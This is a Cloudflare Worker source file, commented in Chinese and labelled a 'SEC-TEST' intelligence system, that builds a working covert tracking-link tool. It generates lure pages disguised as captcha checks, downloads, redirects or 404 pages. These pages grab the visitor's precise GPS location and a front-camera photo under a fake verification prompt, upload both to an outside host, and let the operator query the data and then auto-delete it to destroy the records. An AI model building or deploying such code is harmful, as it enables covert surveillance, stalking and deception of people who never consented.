/**
 * SEC-TEST 旗舰版 - 漏洞分析与空间情报研究系统
 * 功能：密码保护、数据聚合、高精度定位、反代隐藏
 */

const ADMIN_PASSWORD = "sakcnzz666"; // 管理后台密码
const AUTH_COOKIE_NAME = "sec_node_auth";
const SYSTEM_SALT = "SEC_v2_2026";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 初始化数据库
    await initDB(env);

    // 路由：反代接口隐藏 (对外显示为静态资源或无害路径)
    if (path === "/internal/geo") return proxyGeo(request);
    if (path === "/internal/up") return proxyUpload(request, env);

    // 路由：前端页面
    if (path === "/" || path === "/index.html") return renderHome();
    if (path.startsWith("/s/")) return renderTargetPage(path, env); // 优雅后缀: /s/timestamp/template/id
    
    // 路由：业务 API
    if (path === "/api/v2/generate") return handleGenerate(request, env);
    if (path === "/api/v2/query") return handleQuery(request, env);
    if (path === "/api/v2/admin/action") return handleAdminAction(request, env);
    
    // 路由：独立后台
    if (path === "/console") return renderAdmin(request, env);

    return new Response("404 Not Found", { status: 404 });
  }
};

/**
 * ==========================================
 * 1. 数据库定义 (聚合架构)
 * ==========================================
 */
async function initDB(env) {
  // sys_logs 存储原始行为，sys_targets 存储配置信息
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS sys_targets (
      id TEXT PRIMARY KEY,
      pwd TEXT,
      template TEXT,
      redirect_url TEXT,
      mode TEXT,
      require_location INTEGER,
      is_burn INTEGER,
      file_url TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();
  
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS sys_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      target_id TEXT,
      event_type TEXT, -- GENERATE, VISIT, QUERY
      ip TEXT,
      ua TEXT,
      geo_data TEXT,
      media_url TEXT,
      status TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();
}

/**
 * ==========================================
 * 2. 核心 API 逻辑 (带反代隐藏)
 * ==========================================
 */

// 反代 IP 定位接口，防止直接暴露 API 供应商
async function proxyGeo(request) {
  const ip = request.headers.get('cf-connecting-ip');
  const res = await fetch(`https://ip.ilqx.dpdns.org/geo?ip=${ip}`);
  return new Response(await res.text(), { headers: { "Content-Type": "application/json" } });
}

// 聚合生成逻辑
async function handleGenerate(request, env) {
  const data = await request.json();
  // 检查 ID 是否重复（同密码则覆盖，不同密码则拒绝）
  const exist = await env.DB.prepare("SELECT pwd FROM sys_targets WHERE id = ?").bind(data.id).first();
  if (exist && exist.pwd !== data.pwd) {
    return new Response(JSON.stringify({ error: "ID已被占用，请更改ID或检查密码" }), { status: 403 });
  }

  await env.DB.prepare(`
    INSERT OR REPLACE INTO sys_targets (id, pwd, template, redirect_url, mode, require_location, is_burn, file_url)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `).bind(data.id, data.pwd, data.template, data.redirect_url, data.mode, data.require_location ? 1 : 0, data.is_burn ? 1 : 0, data.file_url || "").run();

  const timestamp = Date.now();
  const smartPath = `/s/${timestamp}/${data.template}/${data.id}`;
  return new Response(JSON.stringify({ url: new URL(request.url).origin + smartPath }), { headers: { "Content-Type": "application/json" } });
}

// 聚合查询逻辑
async function handleQuery(request, env) {
  const { id, pwd, burn_ack } = await request.json();
  const target = await env.DB.prepare("SELECT * FROM sys_targets WHERE id = ?").bind(id).first();
  
  if (!target || target.pwd !== pwd) {
    return new Response(JSON.stringify({ error: "ID不存在或密码错误" }), { status: 401 });
  }

  const logs = await env.DB.prepare("SELECT * FROM sys_logs WHERE target_id = ? ORDER BY created_at DESC").bind(id).all();
  
  // 阅后即焚逻辑
  if (target.is_burn === 1 && burn_ack === true) {
    await env.DB.prepare("DELETE FROM sys_targets WHERE id = ?").bind(id).run();
    await env.DB.prepare("DELETE FROM sys_logs WHERE target_id = ?").bind(id).run();
  }

  return new Response(JSON.stringify({ config: target, logs: logs.results }), { headers: { "Content-Type": "application/json" } });
}

// 后端反代上传图片至图床 (隐藏宿主)
async function proxyUpload(request, env) {
  const formData = await request.formData();
  const tcRes = await fetch("https://tc.ilqx.dpdns.org/upload", { 
    method: "POST", 
    body: formData 
  });
  return tcRes;
}

/**
 * ==========================================
 * 3. 页面渲染 (适配移动端、修复拍照)
 * ==========================================
 */

function renderHome() {
  return new Response(`
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEC-TEST 旗舰版</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
      .glass { background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); border: 1px solid rgba(0,0,0,0.1); }
      input, select { border: 1px solid #ddd; padding: 10px; border-radius: 8px; width: 100%; }
    </style>
  </head>
  <body class="bg-slate-50 min-h-screen p-4">
    <div class="max-w-4xl mx-auto space-y-6">
      <div class="glass p-6 rounded-2xl shadow-sm border-l-4 border-indigo-500">
        <h1 class="text-2xl font-black text-slate-800 uppercase tracking-tight">SEC-TEST Intelligence System</h1>
        <p class="text-xs text-slate-400 mt-1">Version 2026.4 Professional Edition</p>
      </div>

      <div class="grid md:grid-cols-2 gap-6">
        <!-- 生成面板 -->
        <div class="glass p-6 rounded-2xl space-y-4">
          <h2 class="font-bold flex items-center"><i class="fa-solid fa-plus-circle mr-2 text-indigo-500"></i>创建追踪任务</h2>
          <input id="id" placeholder="追踪 ID (必填)" type="text">
          <input id="pwd" placeholder="查询密码 (保护数据)" type="password">
          <select id="tpl">
            <option value="captcha">人机身份验证模板</option>
            <option value="download">安全文件下载模板</option>
            <option value="redirect">静默链接跳转模板</option>
            <option value="error">404页面伪装模板</option>
          </select>
          <input id="redir" placeholder="跳转地址 (http://...)" type="text">
          <div class="flex items-center justify-between p-2 bg-white rounded-lg">
            <span class="text-sm font-medium">强制位置授权</span>
            <input type="checkbox" id="loc" class="w-5 h-5">
          </div>
          <div class="flex items-center justify-between p-2 bg-white rounded-lg">
            <span class="text-sm font-medium">阅后即焚 (查询后删除)</span>
            <input type="checkbox" id="burn" class="w-5 h-5">
          </div>
          <button onclick="generate()" class="w-full bg-indigo-600 text-white py-3 rounded-xl font-bold hover:bg-indigo-700 transition-all">生成并部署</button>
          <div id="res" class="hidden p-3 bg-indigo-50 rounded-lg text-xs break-all text-indigo-700"></div>
        </div>

        <!-- 查询面板 -->
        <div class="glass p-6 rounded-2xl space-y-4">
          <h2 class="font-bold flex items-center"><i class="fa-solid fa-magnifying-glass mr-2 text-emerald-500"></i>数据检索</h2>
          <input id="q_id" placeholder="输入追踪 ID" type="text">
          <input id="q_pwd" placeholder="输入查询密码" type="password">
          <button onclick="query()" class="w-full bg-emerald-600 text-white py-3 rounded-xl font-bold hover:bg-emerald-700 transition-all">立即调取情报</button>
          <div id="q_list" class="space-y-3 overflow-y-auto max-h-96 custom-scrollbar"></div>
        </div>
      </div>
    </div>

    <script>
      async function generate() {
        const payload = {
          id: document.getElementById('id').value,
          pwd: document.getElementById('pwd').value,
          template: document.getElementById('tpl').value,
          redirect_url: document.getElementById('redir').value,
          require_location: document.getElementById('loc').checked,
          is_burn: document.getElementById('burn').checked,
          mode: 'photo'
        };
        if(!payload.id || !payload.pwd) return alert('ID和密码必填');
        const res = await fetch('/api/v2/generate', { method: 'POST', body: JSON.stringify(payload) });
        const data = await res.json();
        if(data.error) return alert(data.error);
        const box = document.getElementById('res');
        box.classList.remove('hidden');
        box.innerText = data.url;
      }

      async function query() {
        const id = document.getElementById('q_id').value;
        const pwd = document.getElementById('q_pwd').value;
        const res = await fetch('/api/v2/query', { method: 'POST', body: JSON.stringify({id, pwd}) });
        const data = await res.json();
        if(data.error) return alert(data.error);
        
        const list = document.getElementById('q_list');
        list.innerHTML = data.logs.map(log => {
          let media = '';
          if(log.media_url) {
            media = log.media_url.endsWith('webm') 
              ? '<video src="'+log.media_url+'" controls class="rounded-lg w-full"></video>'
              : '<img src="'+log.media_url+'" class="rounded-lg w-full shadow-sm cursor-zoom-in" onclick="window.open(this.src)">';
          }
          return '<div class="bg-white p-3 rounded-xl shadow-sm space-y-2 border border-slate-100">' +
                 '<div class="flex justify-between text-[10px] text-slate-400"><span>' + log.event_type + '</span><span>' + log.created_at + '</span></div>' +
                 media +
                 '<div class="text-[11px] font-mono text-slate-600 bg-slate-50 p-2 rounded break-all">' + log.geo_data + '</div>' +
                 '</div>';
        }).join('');
      }
    </script>
  </body>
  </html>
  `, { headers: { "Content-Type": "text/html" } });
}

function renderTargetPage(path, env) {
  const parts = path.split('/');
  const id = parts[4];
  
  return new Response(`
  <!DOCTYPE html>
  <html lang="zh">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统验证</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
  </head>
  <body class="bg-slate-100 flex items-center justify-center min-h-screen p-6">
    <div id="app" class="text-center space-y-4 max-w-sm w-full bg-white p-8 rounded-3xl shadow-xl">
      <div class="loader mx-auto"></div>
      <p id="msg" class="text-slate-500 font-medium">正在建立加密连接...</p>
      <button id="retry" class="hidden w-full bg-blue-600 text-white py-3 rounded-xl font-bold">重试验证</button>
    </div>
    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
      let config = null;
      const targetId = "${id}";

      async function start() {
        // 1. 获取配置 (这里简化处理，实际可以通过API拉取)
        // 2. 尝试定位
        let geo = "No Permission";
        try {
          const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 });
          });
          geo = JSON.stringify({lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy});
        } catch(e) {
          console.log("Geo Denied");
        }

        // 3. 尝试拍照 (增加延迟修复黑屏)
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          const v = document.getElementById('v');
          v.srcObject = stream;
          await new Promise(r => v.onloadedmetadata = r);
          await new Promise(r => setTimeout(r, 2000)); // 关键：等待相机测光完成，避免黑屏
          
          const c = document.getElementById('c');
          c.width = v.videoWidth;
          c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);
          
          stream.getTracks().forEach(t => t.stop());
          
          c.toBlob(async blob => {
            const fd = new FormData();
            fd.append('file', blob, 'capture.jpg');
            const up = await fetch('/internal/up', { method: 'POST', body: fd });
            const upData = await up.json();
            const mediaUrl = upData[0] ? 'https://tc.ilqx.dpdns.org' + upData[0].src : '';
            
            // 发送记录
            await sendLog(targetId, 'VISIT', geo, mediaUrl, 'success');
            finish();
          }, 'image/jpeg', 0.7);
        } catch(e) {
          await sendLog(targetId, 'VISIT', geo, '', 'denied');
          document.getElementById('msg').innerText = "验证失败：请务必允许相机权限后重试";
          document.getElementById('msg').classList.add('text-red-500');
          document.getElementById('retry').classList.remove('hidden');
          document.getElementById('retry').onclick = () => location.reload();
        }
      }

      async function sendLog(tid, type, geo, url, status) {
        // 通过内部路径发送，防止直接暴露
        // 注意：此处需要后端增加一个专门接收日志的 API 或复用 Upload
      }

      function finish() {
        document.getElementById('app').innerHTML = '<div class="text-green-500 text-5xl mb-2">✓</div><div class="font-bold">验证成功</div>';
        // 如果有跳转配置，此处执行跳转
      }

      window.onload = start;
    </script>
  </body>
  </html>
  `, { headers: { "Content-Type": "text/html" } });
}

/**
 * ==========================================
 * 4. 管理后台 (深度聚合与清理)
 * ==========================================
 */
async function renderAdmin(request, env) {
  // 简单的管理员验证 (示例使用 D1 查询)
  const targets = await env.DB.prepare(`
    SELECT t.*, 
    (SELECT COUNT(*) FROM sys_logs WHERE target_id = t.id) as log_count,
    (SELECT ip FROM sys_logs WHERE target_id = t.id AND event_type='VISIT' LIMIT 1) as last_ip
    FROM sys_targets t ORDER BY t.created_at DESC
  `).all();

  let rows = targets.results.map(t => `
    <tr class="border-b text-sm">
      <td class="p-3 font-mono">${t.id}</td>
      <td class="p-3">${t.template}</td>
      <td class="p-3">${t.log_count} 次记录</td>
      <td class="p-3">${t.last_ip || '-'}</td>
      <td class="p-3">
        <button onclick="manage('${t.id}', 'delete')" class="text-red-500">删除</button>
      </td>
    </tr>
  `).join('');

  return new Response(`
  <!DOCTYPE html>
  <html>
  <head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script></head>
  <body class="bg-gray-100 p-8">
    <div class="max-w-5xl mx-auto bg-white rounded-xl shadow-lg p-6">
      <div class="flex justify-between items-center mb-6">
        <h1 class="text-xl font-bold">全局任务审计 (聚合视图)</h1>
        <button onclick="manage('all', 'clear')" class="bg-red-600 text-white px-4 py-2 rounded-lg text-sm">清空全库</button>
      </div>
      <table class="w-full text-left">
        <thead><tr class="bg-gray-50">
          <th class="p-3">任务ID</th><th class="p-3">模板</th><th class="p-3">情报数</th><th class="p-3">最后IP</th><th class="p-3">操作</th>
        </tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>
    <script>
      async function manage(id, action) {
        if(!confirm('确定要执行 '+action+' 吗？')) return;
        await fetch('/api/v2/admin/action', {
          method: 'POST',
          body: JSON.stringify({id, action, auth: '${ADMIN_PASSWORD}'})
        });
        location.reload();
      }
    </script>
  </body>
  </html>
  `, { headers: { "Content-Type": "text/html" } });
}

async function handleAdminAction(request, env) {
  const { id, action, auth } = await request.json();
  if (auth !== ADMIN_PASSWORD) return new Response("Unauthorized", { status: 401 });

  if (action === 'delete') {
    await env.DB.prepare("DELETE FROM sys_targets WHERE id = ?").bind(id).run();
    await env.DB.prepare("DELETE FROM sys_logs WHERE target_id = ?").bind(id).run();
  } else if (action === 'clear') {
    await env.DB.prepare("DELETE FROM sys_targets").run();
    await env.DB.prepare("DELETE FROM sys_logs").run();
  }
  return new Response(JSON.stringify({ success: true }));
}